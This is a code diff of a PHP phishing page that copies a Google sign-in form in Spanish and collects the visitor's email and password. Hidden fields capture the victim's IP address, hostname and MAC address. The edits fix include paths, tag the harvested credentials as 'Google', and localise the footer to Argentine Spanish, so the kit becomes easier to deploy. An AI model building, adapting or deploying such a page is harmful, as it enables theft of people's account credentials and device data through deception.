@@ -1,6 +1,6 @@
 <?php
 $destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
-require_once('helper.php');
+require_once('../helper.php');
 ?>
 
 <!DOCTYPE html>
@@ -15,7 +15,7 @@ require_once('helper.php');
 <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
 <link rel="icon" type="image/png" href="assets/img/f8593y1ses.png"/>
 
-<script src="jquery-2.2.1.min.js"></script>
+<script src="../jquery-2.2.1.min.js"></script>
 <script type="text/javascript">
   function redirect() {
     setTimeout(function() {
@@ -32,6 +32,7 @@ require_once('helper.php');
 	<h2>Con tu cuenta de Google</h2>
 	<input id="user" type="text" name="email" placeholder="Correo electrónico o teléfono"  _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
 	<input type="password" name="password" placeholder="Contraseña" autocorrect="off" autocomplete="off" autocapitalize="off" required>
+	<input type="hidden" name="social" value="Google">
 	<input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
 	<input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
 	<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
@@ -40,8 +41,8 @@ require_once('helper.php');
 	<p><a href="">Más opciones</a><span class="text-right"><button type="submit">SIGUIENTE</button></span></p>
 </form>
 <footer>
-	English (United States)<img src="assets/img/mq40xx0kce.gif" alt="">
-	<span class="text-right">Help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Terms</span>
+	Español (Argentina)<img src="assets/img/mq40xx0kce.gif" alt="">
+	<span class="text-right">Ayuda&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacidad&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Términos</span>
 </footer>
 <script>document.onload = function() { document.getElementById("user").focus();};</script>
 </body>
